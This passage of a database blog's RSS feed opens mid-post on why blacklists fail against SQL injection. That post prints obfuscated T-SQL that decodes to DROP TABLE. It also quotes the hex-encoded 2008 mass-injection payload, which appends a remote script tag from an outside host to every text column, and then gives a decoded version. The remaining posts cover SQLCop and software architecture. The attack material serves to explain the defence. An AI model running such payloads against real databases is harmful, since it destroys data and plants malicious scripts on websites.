+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">PRINT</span> <span class="kw2">REVERSE</span><span class="br0">&#40;</span><span class="st0">'tset ELBAT PORD'</span><span class="br0">&#41;</span>
+<span class="kw1">PRINT</span> <span class="kw1">convert</span><span class="br0">&#40;</span><span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">100</span><span class="br0">&#41;</span>,0x44524F50205441424C4520746573740000000000<span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">PRINT REVERSE('tset ELBAT PORD')
+PRINT convert(VARCHAR(100),0x44524F50205441424C4520746573740000000000)</pre></div></div>
+
+<p>Change PRINT to EXEC() and both will result in DROP TABLE Test</p>
+<p>Remember this one?</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="de1"><pre class="de1">&nbsp;<span class="kw1">DECLARE</span> @S <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span>;<span class="kw1">SET</span> @S<span class="sy0">=</span><span class="kw1">CAST</span><span class="br0">&#40;</span>0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
+3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
+612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
+206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
+78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
+2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
+524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
+5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
+5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
+2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
+622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
+7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
+414C4C4F43415445205461626C655F437572736F7220 <span class="kw1">AS</span> <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;<span class="kw1">print</span> @S;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse"> DECLARE @S VARCHAR(4000);SET @S=CAST(0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
+3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
+612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
+206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
+78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
+2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
+524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
+5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
+5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
+2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
+622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
+7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
+414C4C4F43415445205461626C655F437572736F7220 AS VARCHAR(4000));print @S;</pre></div></div>
+
+<p>That becomes this</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">DECLARE</span> @T <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">255</span><span class="br0">&#41;</span>,@C <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">255</span><span class="br0">&#41;</span> 
+<span class="kw1">DECLARE</span> Table_Cursor <span class="kw1">CURSOR</span> <span class="kw1">FOR</span> <span class="kw1">SELECT</span> a.<span class="me1">name</span>,b.<span class="me1">name</span> 
+<span class="kw1">FROM</span> sysobjects a,syscolumns b 
+<span class="kw1">WHERE</span> a.<span class="me1">id</span><span class="sy0">=</span>b.<span class="me1">id</span> <span class="sy0">AND</span> a.<span class="me1">xtype</span><span class="sy0">=</span><span class="st0">'u'</span> <span class="sy0">AND</span> <span class="br0">&#40;</span>b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">99</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">35</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">231</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">167</span><span class="br0">&#41;</span> 
+<span class="kw1">OPEN</span> Table_Cursor 
+&nbsp; &nbsp; <span class="kw1">FETCH</span> <span class="kw1">NEXT</span> <span class="kw1">FROM</span> Table_Cursor <span class="kw1">INTO</span> @T,@C 
+&nbsp; &nbsp; <span class="kw1">WHILE</span><span class="br0">&#40;</span><span class="kw2">@@FETCH_STATUS</span><span class="sy0">=</span><span class="nu0">0</span><span class="br0">&#41;</span> 
+&nbsp; &nbsp; <span class="kw1">BEGIN</span> 
+<span class="co1">--I changed EXEC to PRINT, just in case you are foolish enough to run this</span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">PRINT</span><span class="br0">&#40;</span><span class="st0">'UPDATE ['</span><span class="sy0">+</span>@T<span class="sy0">+</span><span class="st0">'] SET ['</span><span class="sy0">+</span>@C<span class="sy0">+</span><span class="st0">']=RTRIM(CONVERT(VARCHAR(4000),['</span><span class="sy0">+</span>@C<span class="sy0">+</span><span class="st0">']))+'</span><span class="st0">'&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;'</span><span class="st0">''</span><span class="br0">&#41;</span> 
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">FETCH</span> <span class="kw1">NEXT</span> <span class="kw1">FROM</span> Table_Cursor <span class="kw1">INTO</span> @T,@C 
+&nbsp; &nbsp; <span class="kw1">END</span> 
+<span class="kw1">CLOSE</span> Table_Cursor <span class="kw1">DEALLOCATE</span> Table_Cursor </pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">DECLARE @T VARCHAR(255),@C VARCHAR(255) 
+DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name 
+FROM sysobjects a,syscolumns b 
+WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) 
+OPEN Table_Cursor 
+	FETCH NEXT FROM Table_Cursor INTO @T,@C 
+	WHILE(@@FETCH_STATUS=0) 
+	BEGIN 
+--I changed EXEC to PRINT, just in case you are foolish enough to run this
+		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;''') 
+		FETCH NEXT FROM Table_Cursor INTO @T,@C 
+	END 
+CLOSE Table_Cursor DEALLOCATE Table_Cursor </pre></div></div>
+
+<p>That infected millions of pages in 2008, there are still variants of this one today. A blacklist won&#8217;t help you in this case.</p>
+<p>You can also protect yourself against this attack by denying SELECT permissions on the sysobjects table, your website user should not have access to these tables in general. If you use stored procedures you can just give access to the stored procedures and nothing else.</p>
+<p>Every web framework today offers a way to use parameterized queries and or stored procedures. There is really no excuse to fall victim to a SQL injection attack these days. </p>
+<p>Even using an ORM like Hibernate or Entity Framework is protected against SQL Injection because it use sp_executesql with proper parameters behind the scenes.</p>
+<p>If you do use stored procedures, you might still have a problem if you are using dynamic SQL inside the proc with EXEC and concatenation instead of sp_executesql with proper parameters</p>
+<p>So why do people start out by using code that is prone to SQL injection? I think there are two parts to this. </p>
+<ol>
+<li>It is easier to debug and see what is contained in the string by doing a debug.write/response.write now you can see exactly what is being sent to the DB</li>
+<li>There are still books/online examples around that show code that concatenate user input with SQL</li>
+</ol>
+<p>Whenever I see code like this when a person asks for help, I immediately tell that person his code is vulnerable to a SQL injection attack, it is my duty to alert this person, it is yours too, we need to educate these people</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>SQLCop behind a Proxy</title>
+		<link>/index.php/datamgmt/datadesign/sqlcop-and-proxy/</link>
+		<comments>/index.php/datamgmt/datadesign/sqlcop-and-proxy/#comments</comments>
+		<pubDate>Mon, 18 Oct 2010 21:09:42 +0000</pubDate>
+		<dc:creator><![CDATA[Ted Krueger (onpnt)]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[Database Administration]]></category>
+		<category><![CDATA[Database Programming]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[Microsoft SQL Server Admin]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[sql server 2008]]></category>
+		<category><![CDATA[sql server community]]></category>
+		<category><![CDATA[sqlcop]]></category>
+
+		<guid isPermaLink="false">/index.php/2010/10/sqlcop-and-proxy/</guid>
+		<description><![CDATA[SQLCop uses an internet connection to ensure that all checks and updates that are added are maintained.  When SQLCop first loads, it checks the SQLCopConfig.xml file to determine if a new SQLCop.xml file needs to be downloaded.  If SQLCop is unable to download the configuration file, it will automatically use the previously saved sqlcop.xml file.  Because of this, a remote file request is always performed when you start up SQLCop.In order to work around this problem with proxy servers there is one of two things you can do to run SQLCop.]]></description>
+				<content:encoded><![CDATA[<p>Today my good friend Aaron Lowe (<a href="http://www.aaronlowe.net/">Blog</a> | <a href="http://twitter.com/Vendoran">Twitter</a>) let me know he was having problems getting <a href="http://sqlcop.lessthandot.com/">SQLCop</a> to run.  The error would come up as soon as the executable would be run to do the initial install and run of the program.   Proxy servers lock down internet traffic to the point explicit allowances must be set in order for programs like SQLCop to function.</p>
+<p>SQLCop uses an internet connection to ensure that all checks and updates that are added are maintained.  When SQLCop first loads, it checks the SQLCopConfig.xml file to determine if a new SQLCop.xml file needs to be downloaded.  If SQLCop is unable to download the configuration file, it will automatically use the previously saved sqlcop.xml file.  Because of this, a remote file request is always performed when you start up SQLCop.</p>
+<p>In order to work around this problem with proxy servers there is one of two things you can do to run SQLCop.</p>
+<ol>
+<li>Ask the network administrator to add the changes to the proxy</li>
+<li>Download two XML files from LessThanDot that are required by SQLCop</li>
+</ol>
+<blockquote><p>The two files are very lightweight!  So don&#8217;t be scared.  They really won&#8217;t bite.</p>
+</blockquote>
+<p>The first is the <strong><a href="http://sqlcop.lessthandot.com/sqlcop.xml">SQLCop.xml</a></strong>.  This file holds all of the checks and links to resources that SQLCop uses.  </p>
+<p>The second file is the <strong><a href="http://sqlcop.lessthandot.com/sqlcopconfig.xml">SQLCopConfig.xml</a></strong>.  This file holds the version levels of SQLCop which is important to know where the version and update levels SQLCop are at.</p>
+<p>Place these two files in the same directory as the SQLCop.exe and SQLCop will run without requiring the check for any updates or pull down new updates to these files.</p>
+<div class="image_block"><img src="/wp-content/uploads/blogs/DataMgmt/sqlcop_programfiles.gif" alt="" title="" width="353" height="167" /></div>
+<p>We appreciate everyone&#8217;s feedback on SQLCop and any problems or suggestions that you have are always welcome.  You can post <a href="http://forum.lessthandot.com/viewforum.php?f=145">forum topics on LessThanDot</a> to let us know.  Also, SQLCop and LessThanDot is run and maintained from <a href="http://lessthandot.com/donate.php">donations</a>.  If you can help, we greatly appreciate it.  <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/sqlcop-and-proxy/feed/</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+		</item>
+		<item>
+		<title>SQLCop, FxCop For SQL Server, Would You Be Interested in This?</title>
+		<link>/index.php/datamgmt/datadesign/sqlcop-fxcop-for-sql-server-would-you-be/</link>
+		<comments>/index.php/datamgmt/datadesign/sqlcop-fxcop-for-sql-server-would-you-be/#comments</comments>
+		<pubDate>Fri, 15 May 2009 12:04:33 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[code analyzer]]></category>
+		<category><![CDATA[sql]]></category>
+		<category><![CDATA[sql server]]></category>
+		<category><![CDATA[sqlcop]]></category>
+
+		<guid isPermaLink="false">/index.php/2009/05/sqlcop-fxcop-for-sql-server-would-you-be/</guid>
+		<description><![CDATA[I have been thinking about creating a tool like this for a while now. I know that there is the SQL Server 2005 Best Practices Analyzer and that in SQL server 2008 this has become Policy Management. What I want to create is a pure T-SQL tool where you can just run a stored proc [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>I have been thinking about creating a tool like this for a while now. I know that there is the SQL Server 2005 Best Practices Analyzer and that in SQL server 2008 this has become Policy Management. What I want to create is a pure T-SQL tool where you can just run a stored proc and specify what to check.</p>
+<p>I wonder if people would be interested in such a tool, I started a therad here: <a href="http://forum.lessthandot.com/viewtopic.php?f=17&amp;t=5836">SQLCop</a> and got some feedback from various people.</p>
+<p>Here is what I want this tool to do</p>
+<p><em>identify that:<br />
+no procs start with sp_<br />
+no tables are named tbl&#8230;..<br />
+no column names have spaces or other crazy characters in them<br />
+every table has a primary key<br />
+no table is clustered on a uniqueidentifier when NEWSEQUENTIALID()is not used as a default<br />
+log and datafiles are on separate drives<br />
+identify procs that call undocumented proc<br />
+identify procs that have exec with dynamic sql and recommend to rewrite that to use sp_executesql<br />
+identify redundant indexes<br />
+identify unused indexes<br />
+indentify fragmented tables<br />
+identify stale statistics<br />
+tables have the float datatype<br />
+text and image datatypes are used<br />
+procs that have transactions but don&#8217;t check for @@error, @@trancount or xact_state()<br />
+procs that have select * instead of column list</p>
+<p><strong>George </strong>added the following</p>
+<p>Highlight columns where the collation does not match the default collation for the database<br />
+identify where the database default collation does not match the default collation for TempDB<br />
+procedures with cursors<br />
+no foreign keys. check for columns with ID in the name and if it&#8217;s not a PK, then it should be a foreign key.<br />
+using @@Identity instead of scope_identity()<br />
+Order By ordinal value instead of listing column names<br />
+using select * instead of a column list<br />
+Check for &#8220;Auto Close&#8221;, &#8220;Auto Create Statistics&#8221;, &#8220;Auto Shrink&#8221;, and &#8220;Auto Update Statistics&#8221;<br />
+triggers that assume a single row is inserted, updated, or deleted.<br />
+non-sargable where clauses.<br />
+check for functions that operate on table data.<br />
+queries involving multiple tables without ANSI style joins.</p>
+<p><strong>SQLSister </strong>came up with the following</p>
+<p>Fields that have no data in the whole table or all fields are &#8220;&#8221;<br />
+Fields where the len of the data stored is close to the max length of the field (possible that the data size may need to be increased), also a way to see the data at the max length to see if data appears to be cut off (Hey I got a file from a client one time that clearly didn&#8217;t have enough space intheir last_name field as it contained many records that were one or two characters off a common last_name and almost all the records were the same length.)<br />
+Tables where the only unique index is on a surrogate key (these may not be wrong but might point to where some unique indexes need to be created)</p>
+<p>Fields containing string delimited data</p>
+<p>Tables that are too wide and tables where the total bytes per record are higher that the total bytes allowed to be sotred in one record.<br />
+Field names that are some text followed by a number, especially if there is more than 1 (phone_1, phone 2, etc)<br />
+First_name, last_name, middle_name combinations that have unique indexes or are pks.</p>
+<p>triggers that do updates based on the whoe data set (no refernce to inserted or deleted)</p>
+<p>Fields containing characters not on the ordinary keyboard. Help to find all those rotten data entries with tabs, etc that mess up data imports and exports.</p>
+<p><strong>Emtucifor </strong>came up with this</p>
+<p> Look for columns using char() instead of varchar() &#8212; I know this may not be an issue in 2008 but it is in 2005.<br />
+ Warn about columns called &#8220;ID&#8221; in every table instead of &#8220;TableNameID&#8221;.<br />
+ Warn about columns not named the same between foreign key table and primary key table (unless another column in the FK table already has that name).<br />
+ Warn about potential problems cause by overuse of WITH (NOLOCK).<br />
+ Warn about constraints without explicit names, generated by the server such as &#8220;PK__blah__07AC1A97&#8221; since scripts against these will not work from database to database (what if you script out &#8220;alter table blah drop constraint PK__blah__07AC1A97&#8221; from Dev and try to run it against Prod it will fail).</p>
+<p>Generalizing Denis&#8217;s uniqueidentifier idea: Find tables whose insert and update patterns cause frequent page splits due to the layout of indexes.<br />
+Find cases of hash joins occurring when loop joins should be used (my most common query-performance improver). My guess is that statistics are misleading the engine to overestimate the number of rows, thus switching to a hash join. But when the leftmost input has only a few rows, e.g. 2000 when the right input has 150000, then a loop join is almost always far superior to a hash join. A join hint can correct the problem, or another way since the number of rows is low is to put them into a temp table or table variable. Sure, those use tempdb, but it is a small amount, and hash joins can take huge temp table space!</p>
+<p>Find query plans that ought to be using bookmark lookups (joining nonclustered index seek to clustered index) instead of scanning clustered index and recommend ways to solve (such as using temp table or table variable, using index hint, other methods)</p>
+<p>Warn about semi-joins using &#8220;SELECT *&#8221; instead of the better &#8220;SELECT 1&#8221; (improvement at query parse time, not expanding * into column list then later discarding it)</p>
+<p>Suggest testing when semi-joins are explicitly or implicitly used, since switching in either direction can at times greatly improve performance (depending on execution plan)</p>
+<p>Implicit anti-semi-join:<br />
+SELECT DISTINCT<br />
+FROM A<br />
+LEFT JOIN B ON A.ID = B.ID<br />
+WHERE B.ID IS NULL</p>
+<p>Explicit anti-semi-join:<br />
+SELECT<br />
+FROM A<br />
+WHERE NOT EXISTS (SELECT 1 FROM B WHERE A.ID = B.ID)</p>
+<p>Implicit semi-join:<br />
+SELECT DISTINCT A.Something &#8212; no B columns in select list, DISTINCT removes duplicates or not DISTINCT keyword but A&lt;-&gt;B relationship is one-to-one<br />
+FROM A<br />
+INNER JOIN B ON A.ID = B.ID</p>
+<p>Explicit semi-join<br />
+SELECT<br />
+FROM A<br />
+WHERE EXISTS (SELECT 1 FROM B WHERE A.ID = B.ID)</em></p>
+<p>So that is a partial list, What do you think, would this be a useful tool? Do you have any suggestions? Should this be an application perhaps or pure T-SQL.</p>
+<p>Leave a comment with your suggestion</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/sqlcop-fxcop-for-sql-server-would-you-be/feed/</wfw:commentRss>
+		<slash:comments>7</slash:comments>
+		</item>
+		<item>
+		<title>Patterns And Practices Application Architecture Guide 2.0, Something Everyone Should Read</title>
+		<link>/index.php/architect/hardwareinfrastructuredesign/patterns-and-practices-application-archi/</link>
+		<comments>/index.php/architect/hardwareinfrastructuredesign/patterns-and-practices-application-archi/#respond</comments>
+		<pubDate>Thu, 12 Mar 2009 11:04:46 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Hardware and Infrastructure Design]]></category>
+		<category><![CDATA[architecture]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[cheat sheets]]></category>
+		<category><![CDATA[data access]]></category>
+		<category><![CDATA[design]]></category>
+		<category><![CDATA[design patterns]]></category>
+		<category><![CDATA[workflow]]></category>
+
+		<guid isPermaLink="false">/index.php/2009/03/patterns-and-practices-application-archi/</guid>
+		<description><![CDATA[I was listening to show number 426 on dotnetrocks: Rob Boucher on Application Architecture Guidance! They mentioned the Patterns And Practices Application Architecture Guide 2.0, this guide is available for free on codeplex.
+
+Although it is a Microsof&#8230;]]></description>
+				<content:encoded><![CDATA[<p>I was listening to show number 426 on dotnetrocks: <a href="http://www.dotnetrocks.com/default.aspx?showNum=426">Rob Boucher on Application Architecture Guidance!</a> They mentioned the <a href="http://www.codeplex.com/AppArchGuide">Patterns And Practices Application Architecture Guide 2.0</a>, this guide is available for free on codeplex.</p>
+<p>Although it is a Microsoft technology centric guide, there should be chapters for every developer in your group.<br />
+Here is one example from the book</p>
+<h3>
+Key Design Principles<br />
+</h3>
+<p>When getting started with your design, bear in mind the key principles that will help you to create architecture that meets “best practices,” minimizes costs and maintenance requirements, and promotes usability and extendibility. The key principles are:
+<ul>
+<li><b>Separation of concerns</b>. Break your application into distinct features that overlap in functionality as little as possible.</li>
+<li><b>Single Responsibility Principle</b>. Each component or a module should be responsible for only a specific feature or functionality.</li>
+<li><b>Principle of least knowledge</b>.** A component or an object should not know about internal details of other components or objects. Also known as the Law of Demeter** (LoD).</li>
+<li><b>Don’t Repeat Yourself (DRY)</b>. There should be only one component providing a specific functionality; the functionality should not be duplicated in any other component.</li>
+<li><b>Avoid doing a big design upfront</b>. If your application requirements are unclear, or if there is a possibility of the design evolving over time, avoid making a large design effort prematurely. This design principle is often abbreviated as BDUF. </li>
+<li><b>Prefer composition over inheritance</b>. Wherever possible, use composition over inheritance when reusing functionality because inheritance increases the dependency between parent and child classes, thereby limiting the reuse of child classes.</li>
+</ul>
+<p>The nice thing is that each chapter has a resource section at the bottom so that you can dive deep into a specific topic mentioned in the chapter itself. This is great stuff and I recommend that you check out this guide. You also might want to listen to the dotnetrocks podcast about this guide: http://www.dotnetrocks.com/default.aspx?showNum=426</p>
+<p>Here is a list of all the chapters, make sure you check out the cheat sheets</p>
+<h3>
+Chapters<br />
+</h3>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Introduction%20V2&amp;referringTitle=Home">Introduction</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Architecture%20and%20Design%20Solutions%20At%20a%20Glance&amp;referringTitle=Home">Architecture and Design Solutions At a Glance</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Fast%20Track&amp;referringTitle=Home">Fast Track</a></li>
+</ul>
+<h4>
+Part I, Fundamentals<br />
+</h4>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%201%20-%20Architecture%20Fundamentals&amp;referringTitle=Home">Chapter 1 &#8211; Fundamentals of Application Architecture </a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=.NET%20Platform%20Overview%20V2&amp;referringTitle=Home">Chapter 2 &#8211; .NET Platform Overview</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%203%20-%20Architecture%20and%20Design%20Guidelines&amp;referringTitle=Home">Chapter 3 &#8211; Architecture and Design Guidelines</a></li>
+</ul>
+<h4>
+Part II, Design<br />
+</h4>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%204%20-%20Designing%20Your%20Architecture&amp;referringTitle=Home">Chapter 4 &#8211; Designing Your Architecture</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%205%20-%20Deployment%20Patterns&amp;referringTitle=Home">Chapter 5 &#8211; Deployment Patterns</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%206%20-%20Architectural%20Styles&amp;referringTitle=Home">Chapter 6 &#8211; Architectural Styles</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%207%20-%20Quality%20Attributes&amp;referringTitle=Home">Chapter 7 &#8211; Quality Attributes</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%208%20-%20Communication%20Guidelines&amp;referringTitle=Home">Chapter 8 &#8211; Communication Guidelines</a></li>
+</ul>
+<h4>
+Part III, Layers<br />
+</h4>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%209%20-%20Layers%20and%20Tiers&amp;referringTitle=Home">Chapter 9 &#8211; Layers and Tiers</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2010%20-%20Presentation%20Layer%20Guidelines&amp;referringTitle=Home">Chapter 10 &#8211; Presentation Layer Guidelines</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2011%20-%20Business%20Layer%20Guidelines&amp;referringTitle=Home">Chapter 11 &#8211; Business Layer Guidelines</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2012%20-%20Data%20Access%20Layer%20Guidelines&amp;referringTitle=Home">Chapter 12 &#8211; Data Access Layer Guidelines</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2013%20-%20Service%20Layer%20Guidelines&amp;referringTitle=Home">Chapter 13 &#8211; Service Layer Guidelines</a></li>
+</ul>
+<h4>
+Part IV, Archetypes<br />
+</h4>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2014%20-%20Application%20Archetypes&amp;referringTitle=Home">Chapter 14 &#8211; Application Archetypes</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2015%20-%20Web%20Applications&amp;referringTitle=Home">Chapter 15 &#8211; Web Applications</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2016%20-%20Rich%20Internet%20Applications%20%28RIA%29&amp;referringTitle=Home">Chapter 16 &#8211; Rich Internet Applications (RIA)</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2017%20-%20Rich%20Client%20Applications&amp;referringTitle=Home">Chapter 17 &#8211; Rich Client Applications</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2018%20-%20Services&amp;referringTitle=Home">Chapter 18 &#8211; Services</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2019%20-%20Mobile%20Applications&amp;referringTitle=Home">Chapter 19 &#8211; Mobile Applications</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2020%20-%20Office%20Business%20Applications%20%28OBA%29&amp;referringTitle=Home">Chapter 20 &#8211; Office Business Applications (OBA)</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Chapter%2021%20-%20SharePoint%20LOB%20Applications&amp;referringTitle=Home">Chapter 21 &#8211; SharePoint Line-Of-Business (LOB) Applications</a></li>
+</ul>
+<h4>
+Appendix<br />
+</h4>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Pattern%20Catalog%20V2&amp;referringTitle=Home">Cheat Sheet &#8211; patterns &amp; practices Pattern Catalog</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Cheat%20Sheet%20-%20Presentation%20Technology%20Matrix&amp;referringTitle=Home">Cheat Sheet &#8211; Presentation Technology Matrix</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Cheat%20Sheet%20-%20Data%20Access%20Technology%20Matrix&amp;referringTitle=Home">Cheat Sheet &#8211; Data Access Technology Matrix</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Cheat%20Sheet%20-%20Workflow%20Technology%20Matrix&amp;referringTitle=Home">Cheat Sheet &#8211; Workflow Technology Matrix</a></li>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Cheat%20Sheet%20-%20Integration%20Technology%20Matrix&amp;referringTitle=Home">Cheat Sheet &#8211; Integration Technology Matrix</a></li>
+</ul>
+<h3>
+Errata Page<br />
+</h3>
+<ul>
+<li><a href="http://apparchguide.codeplex.com/Wiki/View.aspx?title=Errata%20Page&amp;referringTitle=Home">Errata Page</a></li>
+</ul>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/architect/hardwareinfrastructuredesign/patterns-and-practices-application-archi/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Want To Learn Scrum? Visit About Scrum.</title>
+		<link>/index.php/itprofessionals/ethicsit/want-to-learn-scrum-visit-about-scrum/</link>
+		<comments>/index.php/itprofessionals/ethicsit/want-to-learn-scrum-visit-about-scrum/#respond</comments>
+		<pubDate>Wed, 24 Dec 2008 11:40:18 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Ethics and IT]]></category>
+		<category><![CDATA[agile]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[scrum]]></category>
+
+		<guid isPermaLink="false">/index.php/2008/12/want-to-learn-scrum-visit-about-scrum/</guid>
+		<description><![CDATA[I noticed that a new site has been launched named About Scrum This site is intended to be a resource for those who wish to learn about SCRUM and software project management in general. So far it is looking great, they have a couple of videos up and also a bunch of articles. Here is [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>I noticed that a new site has been launched named <a href="http://aboutscrum.com/">About Scrum</a></p>
